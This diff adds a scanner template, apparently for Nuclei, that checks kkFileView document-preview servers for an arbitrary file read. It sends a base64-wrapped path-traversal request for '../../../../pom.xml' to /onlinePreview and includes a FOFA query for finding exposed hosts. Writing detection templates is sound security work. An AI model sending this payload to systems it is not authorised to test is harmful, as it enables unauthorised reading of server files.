@@ -1,0 +1,22 @@
+id: kkfileview-wendang-onlinePreview-fileread
+
+info:
+  name: kkfileview-wendang-onlinePreview-fileread
+  author: linfeng7z
+  severity: medium
+  description: kkFileView 文档管理系统 存在任意文件(pdf、image、ppt、excel等)读取漏洞。
+  tags: kkfileview,fileread
+  metadata:
+    fofa-qeury: body="/onlinePreview?url"
+
+http:
+  - raw:
+      - |
+        GET /onlinePreview?url={{base64("http://{{Hostname}}/?fullfilename=../../../../pom.xml")}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15               
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains(body,"<input hidden id=\"textData\" value=\"") && contains(header,"text/html")'
